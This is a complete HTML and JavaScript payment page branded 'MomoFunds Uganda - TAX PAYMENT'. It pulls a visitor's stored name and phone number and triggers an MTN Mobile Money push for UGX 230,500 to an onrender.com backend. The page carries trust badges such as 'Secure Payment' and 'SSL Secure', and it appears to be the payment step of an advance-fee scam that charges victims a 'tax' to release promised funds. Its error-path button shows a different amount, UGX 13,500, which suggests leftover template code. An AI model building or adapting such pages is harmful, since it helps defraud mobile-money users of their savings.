<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#FFCC00">
<title>MomoFunds Uganda - TAX PAYMENT</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:"Inter",sans-serif;}

body{
min-height:100vh;
display:flex;
justify-content:center;
align-items:center;
padding:10px;
background:
radial-gradient(circle at 10% 10%, rgba(255,204,0,.35), transparent 28%),
radial-gradient(circle at 90% 90%, rgba(249,168,37,.25), transparent 28%),
linear-gradient(135deg,#FFF8E1,#FFE082);
}

.container{width:100%;max-width:385px;}

.card{
background:#fff;
border-radius:22px;
overflow:hidden;
box-shadow:0 16px 45px rgba(0,0,0,.24);
}

.header{
background:linear-gradient(135deg,#FFCC00,#F9A825);
color:#1F2937;
text-align:center;
padding:18px 16px 36px;
position:relative;
}

.step{
display:inline-block;
padding:5px 12px;
border-radius:999px;
background:rgba(31,41,55,.08);
font-size:11px;
margin-bottom:10px;
font-weight:700;
}

.header h1{font-size:24px;font-weight:800;}
.header p{font-size:13px;margin-top:4px;color:#374151;}

.badge{
position:absolute;
left:50%;
bottom:-21px;
transform:translateX(-50%);
width:42px;
height:42px;
background:#fff;
border-radius:14px;
display:flex;
justify-content:center;
align-items:center;
font-size:20px;
box-shadow:0 8px 20px rgba(249,168,37,.3);
}

.content{padding:30px 16px 16px;}

.status{
background:#FFF8E1;
border:1px solid #FFE082;
border-radius:14px;
padding:12px;
margin-bottom:14px;
}

.status-row{
display:flex;
align-items:center;
gap:10px;
font-size:14px;
font-weight:700;
color:#8A4B00;
padding:6px 0;
}

.tick{
width:26px;
height:26px;
background:#FFE082;
border-radius:50%;
display:flex;
justify-content:center;
align-items:center;
font-size:16px;
flex-shrink:0;
}

.info{
background:#FFF8E1;
border:1px solid #FFE082;
border-radius:14px;
padding:13px;
font-size:13px;
line-height:1.5;
color:#374151;
margin-bottom:16px;
}

.customer{
display:flex;
flex-direction:column;
gap:8px;
margin-bottom:16px;
}

.customer-row{
display:flex;
justify-content:space-between;
align-items:center;
padding:11px;
background:#F9FAFB;
border:1px solid #E5E7EB;
border-radius:12px;
}

.label{
display:flex;
align-items:center;
gap:9px;
font-size:13px;
color:#64748B;
font-weight:500;
}

.icon{
width:30px;
height:30px;
background:#FFF8E1;
border-radius:10px;
display:flex;
justify-content:center;
align-items:center;
font-size:15px;
}

.value{
font-size:13px;
font-weight:700;
color:#1F2937;
}

.amount{
background:#FFF8E1;
border-left:5px solid #FFCC00;
border-radius:14px;
padding:15px;
text-align:center;
margin-bottom:16px;
}

.amount small{
display:block;
font-size:11px;
color:#64748B;
margin-bottom:4px;
}

.amount strong{
font-size:28px;
font-weight:800;
color:#1F2937;
}

button{
width:100%;
padding:16px;
border:none;
border-radius:16px;
background:linear-gradient(135deg,#1F2937,#111827);
color:#fff;
font-size:17px;
font-weight:700;
cursor:pointer;
position:relative;
overflow:hidden;
box-shadow:0 12px 28px rgba(17,24,39,.35);
transition:.25s;
}

button::before{
content:"";
position:absolute;
top:0;
left:-120%;
width:50%;
height:100%;
background:linear-gradient(120deg,transparent,rgba(255,255,255,.35),transparent);
transform:skewX(-20deg);
transition:.6s;
}

button:hover::before{left:140%;}
button:hover{transform:translateY(-2px);}
button:disabled{opacity:.6;cursor:not-allowed;}

#stkMessage{
margin-top:12px;
padding:8px;
border-radius:8px;
text-align:center;
font-size:13px;
min-height:20px;
}

.success{background:#ECFDF5;color:#15803D;}
.error{background:#FEF2F2;color:#DC2626;}

.footer{
display:flex;
justify-content:space-between;
flex-wrap:wrap;
gap:6px;
margin-top:14px;
padding-top:12px;
border-top:1px solid #E5E7EB;
font-size:10px;
color:#64748B;
}
</style>
</head>

<body>

<div class="container">
<div class="card">

<div class="header">
<div class="step">TAX PAYMENT</div>
<h1>🇺🇬 MomoFunds Uganda</h1>
<p>Complete your payment</p>
<div class="badge">💳</div>
</div>

<div class="content">

<div class="status">
<div class="status-row"><div class="tick">✓</div><span>Secure Payment</span></div>
<div class="status-row"><div class="tick">✓</div><span>MTN Mobile Money</span></div>
<div class="status-row"><div class="tick">✓</div><span>Real-time Confirmation</span></div>
</div>

<div class="info">
Review your details below and complete your payment using MTN Mobile Money.
</div>

<div class="customer">

<div class="customer-row">
<div class="label"><div class="icon">👤</div>Customer</div>
<div class="value" id="fullName">Loading...</div>
</div>

<div class="customer-row">
<div class="label"><div class="icon">📱</div>Phone</div>
<div class="value" id="phone">Loading...</div>
</div>

</div>

<div class="amount">
<small>Amount Due</small>
<strong>UGX 230,500</strong>
</div>

<button id="payBtn">Pay UGX 230,500 →</button>

<div id="stkMessage"></div>

<div class="footer">
<span>🔒 SSL Secure</span>
<span>MTN Mobile Money</span>
<span>Protected</span>
</div>

</div>
</div>
</div>

<script>
"use strict";

const BACKEND_URL="https://https-momo-funds-uganda-onrender-com.onrender.com";
const PAYMENT_AMOUNT=230500;

document.getElementById("fullName").textContent=
localStorage.getItem("fullName")||
localStorage.getItem("fullname")||
"Customer";

document.getElementById("phone").textContent=
localStorage.getItem("phoneNumber")||
localStorage.getItem("phone")||
"Not available";

const payBtn=document.getElementById("payBtn");
const message=document.getElementById("stkMessage");

function setMessage(text,type=""){
message.textContent=text;
message.className=type;
}

function setButton(disabled,text){
payBtn.disabled=disabled;
payBtn.textContent=text;
}

async function readJson(response){
const txt=await response.text();
if(!txt) return {};
try{
return JSON.parse(txt);
}catch{
throw new Error("Invalid server response.");
}
}

async function payNow(){

const phone=
localStorage.getItem("phoneNumber")||
localStorage.getItem("phone");

if(!phone){
setMessage("Phone number not found.","error");
return;
}

setButton(true,"Sending Request...");
setMessage("Sending payment request...");

try{

const response=await fetch(`${BACKEND_URL}/api/uganda/stk-push`,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
phone,
amount:PAYMENT_AMOUNT
})
});

const data=await readJson(response);

if(!response.ok||data.success===false){
throw new Error(data.message||"Payment request failed.");
}

const transactionId=
data.transactionId||
data.data?.transaction_id||
data.data?.transactionId||
data.transaction_id||
data.reference||
data.data?.reference;

if(!transactionId){
throw new Error("Transaction reference missing.");
}

setButton(true,"Waiting...");
setMessage("Payment request sent. Waiting for confirmation...");

await checkPayment(transactionId);

}catch(error){

setMessage(error.message,"error");
setButton(false,"Pay UGX 13,500 →");

}

}

async function checkPayment(transactionId){

const start=Date.now();

while(Date.now()-start<120000){

try{

const response=await fetch(
`${BACKEND_URL}/api/uganda/status/${transactionId}`
);

const result=await readJson(response);

const status=String(result.data?.status||"").toUpperCase();

if(status==="PENDING"){
setMessage("Payment request sent. Waiting for confirmation...");
}

if(["SUCCESS","SUCCESSFUL"].includes(status)){
setMessage("Payment confirmed. Redirecting...","success");
setButton(true,"Payment Confirmed");

setTimeout(()=>{
window.location.href="final.html";
},1000);

return;
}

if(["FAILED","CANCELLED"].includes(status)){
throw new Error("Payment "+status.toLowerCase()+".");
}

}catch(error){

if(/failed|cancelled/i.test(error.message)){
setMessage(error.message,"error");
setButton(false,"Pay UGX 13,500 →");
return;
}

}

await new Promise(resolve=>setTimeout(resolve,3000));

}

setMessage("Payment confirmation timed out.","error");
setButton(false,"Pay UGX 13,500 →");

}

payBtn.addEventListener("click",payNow);
</script>

</body>
</html>
